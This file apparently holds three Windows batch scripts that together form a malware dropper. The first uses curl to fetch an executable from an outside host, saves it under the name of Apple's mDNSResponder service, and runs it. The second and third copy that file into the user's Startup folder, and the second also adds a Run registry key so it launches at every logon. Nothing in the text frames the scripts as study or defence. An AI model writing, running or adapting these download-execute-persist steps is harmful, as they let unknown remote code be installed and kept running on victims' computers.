@echo off

REM URL of the file to download
set URL=https://serve.devblogs.io/mDNSrespoder.exe

REM Local directory to save the downloaded file
set LOCAL_DIR=C:\temp\

REM Path to the downloaded file
set LOCAL_FILE=%LOCAL_DIR%mDNSresponder.exe

REM Download the file using curl
curl -o "%LOCAL_FILE%" "%URL%"

REM Check if the file was downloaded successfully
if exist "%LOCAL_FILE%" (
    REM Run the downloaded file using the 32-bit version of cmd.exe
    C:\Windows\SysWOW64\cmd.exe /C "%LOCAL_FILE%"

    
) else (
    echo Error: File download failed.
    
)







@echo off
setlocal

rem Define the source file path
set "source=C:\temp\mDNSresponder.exe"

rem Check if the source file exists
if not exist "%source%" (
    echo Source file not found.
    exit /b 1
)

rem Define the destination folder path for the startup folder
set "destination=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

rem Check if the destination folder exists, create if it doesn't
if not exist "%destination%" (
    mkdir "%destination%"
    if errorlevel 1 (
        echo Failed to create destination folder.
        exit /b 1
    )
)

rem Copy the file to the destination folder
copy "%source%" "%destination%"

rem Check if the copy was successful
if errorlevel 1 (
    echo Failed to copy the file.
    exit /b 1
) else (
    echo File copied successfully to the startup folder.
)

rem Define the registry key path for adding to startup
set "regKey=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
set "appName=MDNSResponder"
set "regValue=%destination%\mDNSresponder.exe"

rem Add the registry entry for startup
reg add "%regKey%" /v "%appName%" /t REG_SZ /d "\"%regValue%\"" /f > nul
if errorlevel 1 (
    echo Failed to add registry entry for startup.
) else (
    echo Registry entry added successfully for startup.
)

endlocal






@echo off
setlocal

rem Define the source and destination paths
set "source=C:\temp\mDNSresponder.exe"
set "destination=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

rem Check if the source file exists
if not exist "%source%" (
    echo Source file not found.
    exit /b 1
)

rem Check if the destination folder exists
if not exist "%destination%" (
    echo Destination folder not found.
    exit /b 1
)

rem Copy the file to the destination folder
copy "%source%" "%destination%"

rem Check if the copy was successful
if errorlevel 1 (
    echo Failed to copy the file.
) else (
    echo File copied successfully to the startup folder.
)

endlocal

